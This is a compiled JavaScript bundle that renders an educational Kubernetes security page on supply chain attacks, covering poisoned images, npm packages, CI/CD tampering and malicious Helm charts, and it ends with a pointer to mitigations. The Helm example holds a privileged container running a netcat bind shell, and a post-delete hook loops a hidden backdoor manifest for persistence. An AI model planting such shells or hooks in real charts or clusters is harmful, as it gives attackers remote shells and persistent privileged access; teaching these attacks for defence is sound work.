"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[6647],{8453:(e,i,n)=>{n.d(i,{R:()=>c,x:()=>r});var s=n(6540);const t={},a=s.createContext(t);function c(e){const i=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(i):{...i,...e}}),[i,e])}function r(e){let i;return i=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:c(e.components),s.createElement(a.Provider,{value:i},e.children)}},9578:(e,i,n)=>{n.r(i),n.d(i,{assets:()=>l,contentTitle:()=>r,default:()=>d,frontMatter:()=>c,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"attack_vectors/supply_chain_attacks","title":"Supply Chain Attacks","description":"How attackers compromise container images, dependencies, CI/CD pipelines, and Helm charts to infiltrate Kubernetes clusters.","source":"@site/docs/attack_vectors/supply_chain_attacks.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/supply_chain_attacks","permalink":"/k8s_security/docs/attack_vectors/supply_chain_attacks","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/supply_chain_attacks.md","tags":[],"version":"current","sidebarPosition":10,"frontMatter":{"sidebar_position":10,"title":"Supply Chain Attacks","description":"How attackers compromise container images, dependencies, CI/CD pipelines, and Helm charts to infiltrate Kubernetes clusters."},"sidebar":"default","previous":{"title":"Exposed Kubelet API","permalink":"/k8s_security/docs/attack_vectors/exposed_kubelet_api"},"next":{"title":"Traffic Hijacking","permalink":"/k8s_security/docs/attack_vectors/traffic_hijacking"}}');var t=n(4848),a=n(8453);const c={sidebar_position:10,title:"Supply Chain Attacks",description:"How attackers compromise container images, dependencies, CI/CD pipelines, and Helm charts to infiltrate Kubernetes clusters."},r="Supply Chain Attacks",l={},o=[{value:"Exploitation Steps: Compromising the Software Supply Chain",id:"exploitation-steps-compromising-the-software-supply-chain",level:2},{value:"Step 1: Poison a Public Image",id:"step-1-poison-a-public-image",level:3},{value:"Step 2: Exploit Weak Image Verification",id:"step-2-exploit-weak-image-verification",level:3},{value:"Step 3: Inject Malicious Dependencies",id:"step-3-inject-malicious-dependencies",level:3},{value:"Step 4: Compromise CI/CD Pipeline",id:"step-4-compromise-cicd-pipeline",level:3},{value:"Exploitation Steps: Deploying a Malicious Helm Chart",id:"exploitation-steps-deploying-a-malicious-helm-chart",level:2},{value:"Step 1: Publish a Malicious Helm Chart",id:"step-1-publish-a-malicious-helm-chart",level:3},{value:"Step 2: Exploit Unverified Helm Chart Usage",id:"step-2-exploit-unverified-helm-chart-usage",level:3},{value:"Step 3: Escalate Privileges Using a Malicious PodSecurityPolicy",id:"step-3-escalate-privileges-using-a-malicious-podsecuritypolicy",level:3},{value:"Step 4: Persist in the Cluster",id:"step-4-persist-in-the-cluster",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function p(e){const i={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,a.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(i.header,{children:(0,t.jsx)(i.h1,{id:"supply-chain-attacks",children:"Supply Chain Attacks"})}),"\n",(0,t.jsxs)(i.p,{children:["A ",(0,t.jsx)(i.strong,{children:"supply chain attack"})," in Kubernetes involves ",(0,t.jsx)(i.strong,{children:"compromising container images, software dependencies, CI/CD pipelines, or Helm charts"})," to inject malicious code into workloads. Attackers use these vulnerabilities to ",(0,t.jsx)(i.strong,{children:"gain initial access, escalate privileges, and exfiltrate sensitive data"}),"."]}),"\n",(0,t.jsx)(i.hr,{}),"\n",(0,t.jsx)(i.h2,{id:"exploitation-steps-compromising-the-software-supply-chain",children:"Exploitation Steps: Compromising the Software Supply Chain"}),"\n",(0,t.jsx)(i.p,{children:"An attacker injects malicious code into a Kubernetes deployment by exploiting weaknesses in the container build process."}),"\n",(0,t.jsx)(i.h3,{id:"step-1-poison-a-public-image",children:"Step 1: Poison a Public Image"}),"\n",(0,t.jsxs)(i.p,{children:["The attacker publishes a ",(0,t.jsx)(i.strong,{children:"malicious container image"})," to a public registry:"]}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-bash",children:"docker build -t attacker/malicious-app .\ndocker push docker.io/attacker/malicious-app\n"})}),"\n",(0,t.jsx)(i.p,{children:"If an organization unknowingly pulls this image, it introduces malicious code into production."}),"\n",(0,t.jsx)(i.h3,{id:"step-2-exploit-weak-image-verification",children:"Step 2: Exploit Weak Image Verification"}),"\n",(0,t.jsx)(i.p,{children:"An organization deploys a container without verifying its source:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-yaml",children:"apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vulnerable-app\nspec:\n  template:\n    spec:\n      containers:\n        - name: app\n          image: docker.io/attacker/malicious-app\n"})}),"\n",(0,t.jsx)(i.p,{children:"Since no image signing or verification is enforced, the compromised container runs in the cluster."}),"\n",(0,t.jsx)(i.h3,{id:"step-3-inject-malicious-dependencies",children:"Step 3: Inject Malicious Dependencies"}),"\n",(0,t.jsxs)(i.p,{children:["If the CI/CD pipeline ",(0,t.jsx)(i.strong,{children:"does not validate third-party dependencies"}),", the attacker injects a malicious package into a widely used library."]}),"\n",(0,t.jsx)(i.p,{children:"Example of an attacker publishing a compromised package:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-bash",children:"npm publish compromised-library\n"})}),"\n",(0,t.jsx)(i.p,{children:"Developers unknowingly include this package in their applications, allowing remote code execution."}),"\n",(0,t.jsx)(i.h3,{id:"step-4-compromise-cicd-pipeline",children:"Step 4: Compromise CI/CD Pipeline"}),"\n",(0,t.jsx)(i.p,{children:"The attacker exploits misconfigured CI/CD secrets to modify Kubernetes manifests:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-bash",children:"kubectl apply -f attacker-modified-deployment.yaml\n"})}),"\n",(0,t.jsx)(i.p,{children:"By injecting malicious configurations, the attacker gains persistent access to the cluster."}),"\n",(0,t.jsx)(i.hr,{}),"\n",(0,t.jsx)(i.h2,{id:"exploitation-steps-deploying-a-malicious-helm-chart",children:"Exploitation Steps: Deploying a Malicious Helm Chart"}),"\n",(0,t.jsxs)(i.p,{children:["An attacker manipulates Helm charts to introduce ",(0,t.jsx)(i.strong,{children:"unauthorized workloads, privilege escalation, or backdoors"})," into a Kubernetes cluster."]}),"\n",(0,t.jsx)(i.h3,{id:"step-1-publish-a-malicious-helm-chart",children:"Step 1: Publish a Malicious Helm Chart"}),"\n",(0,t.jsxs)(i.p,{children:["The attacker creates a Helm chart containing ",(0,t.jsx)(i.strong,{children:"hidden malicious configurations"}),":"]}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-yaml",children:'apiVersion: v2\nname: malicious-app\nversion: 1.0.0\ndescription: "A vulnerable Helm chart"\n'})}),"\n",(0,t.jsxs)(i.p,{children:[(0,t.jsx)(i.strong,{children:"Example of Malicious Workload in Values.yaml"}),":"]}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-yaml",children:'containers:\n  - name: backdoor-container\n    image: attacker/malicious-image\n    securityContext:\n      privileged: true\n    command: ["/bin/sh", "-c"]\n    args: ["while true; do nc -lvp 9001 -e /bin/sh; done"]\n'})}),"\n",(0,t.jsxs)(i.p,{children:["The attacker ",(0,t.jsx)(i.strong,{children:"uploads the chart"})," to a public Helm repository:"]}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-bash",children:"helm package malicious-app\nhelm push malicious-app-1.0.0.tgz oci://public-helm-repo\n"})}),"\n",(0,t.jsx)(i.h3,{id:"step-2-exploit-unverified-helm-chart-usage",children:"Step 2: Exploit Unverified Helm Chart Usage"}),"\n",(0,t.jsxs)(i.p,{children:["An unsuspecting user installs the chart ",(0,t.jsx)(i.strong,{children:"without verifying its integrity"}),":"]}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-bash",children:"helm repo add untrusted-repo oci://public-helm-repo\nhelm install vulnerable-app untrusted-repo/malicious-app\n"})}),"\n",(0,t.jsxs)(i.p,{children:["The ",(0,t.jsx)(i.strong,{children:"malicious container is deployed"}),", providing the attacker with a ",(0,t.jsx)(i.strong,{children:"reverse shell"}),"."]}),"\n",(0,t.jsx)(i.h3,{id:"step-3-escalate-privileges-using-a-malicious-podsecuritypolicy",children:"Step 3: Escalate Privileges Using a Malicious PodSecurityPolicy"}),"\n",(0,t.jsxs)(i.p,{children:["If ",(0,t.jsx)(i.strong,{children:"Pod Security Policies (PSP) or admission controls"})," are not enforced, the attacker modifies Helm templates to allow privilege escalation:"]}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-yaml",children:"apiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: privileged-psp\nspec:\n  privileged: true\n  runAsUser:\n    rule: RunAsAny\n  seLinux:\n    rule: RunAsAny\n"})}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-bash",children:"helm install --set securityPolicy.privileged=true exploit-app\n"})}),"\n",(0,t.jsxs)(i.p,{children:["The attack ",(0,t.jsx)(i.strong,{children:"bypasses Kubernetes security policies"}),", allowing ",(0,t.jsx)(i.strong,{children:"root access"})," on worker nodes."]}),"\n",(0,t.jsx)(i.h3,{id:"step-4-persist-in-the-cluster",children:"Step 4: Persist in the Cluster"}),"\n",(0,t.jsxs)(i.p,{children:["The attacker modifies ",(0,t.jsx)(i.strong,{children:"Helm hooks"})," to maintain persistence after deletion:"]}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-yaml",children:'hooks:\n  post-delete:\n    - exec:\n        command:\n          [\n            "/bin/sh",\n            "-c",\n            "while true; do sleep 60; kubectl apply -f /tmp/hidden-backdoor.yaml; done",\n          ]\n'})}),"\n",(0,t.jsx)(i.p,{children:"Even if the Helm release is removed:"}),"\n",(0,t.jsx)(i.pre,{children:(0,t.jsx)(i.code,{className:"language-bash",children:"helm uninstall exploit-app\n"})}),"\n",(0,t.jsxs)(i.p,{children:["The malicious workload ",(0,t.jsx)(i.strong,{children:"remains active"}),", ensuring long-term access."]}),"\n",(0,t.jsx)(i.h3,{id:"result",children:"Result"}),"\n",(0,t.jsxs)(i.p,{children:["The attacker has ",(0,t.jsx)(i.strong,{children:"infiltrated the Kubernetes environment"})," via a compromised supply chain, enabling ",(0,t.jsx)(i.strong,{children:"persistent access, privilege escalation, and data theft"}),"."]}),"\n",(0,t.jsx)(i.hr,{}),"\n",(0,t.jsx)(i.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,t.jsxs)(i.p,{children:["To protect against ",(0,t.jsx)(i.strong,{children:"supply chain attacks"}),", follow the security best practices outlined in:"]}),"\n",(0,t.jsxs)(i.p,{children:["\u27a1 ",(0,t.jsx)(i.strong,{children:(0,t.jsx)(i.a,{href:"/docs/best_practices/supply_chain_mitigation",children:"Securing the Kubernetes Supply Chain"})})]}),"\n",(0,t.jsxs)(i.p,{children:["This guide covers techniques such as ",(0,t.jsx)(i.strong,{children:"container image signing, vulnerability scanning, CI/CD hardening, Helm security enforcement, and dependency verification"})," to prevent attackers from compromising the software supply chain."]})]})}function d(e={}){const{wrapper:i}={...(0,a.R)(),...e.components};return i?(0,t.jsx)(i,{...e,children:(0,t.jsx)(p,{...e})}):p(e)}}}]);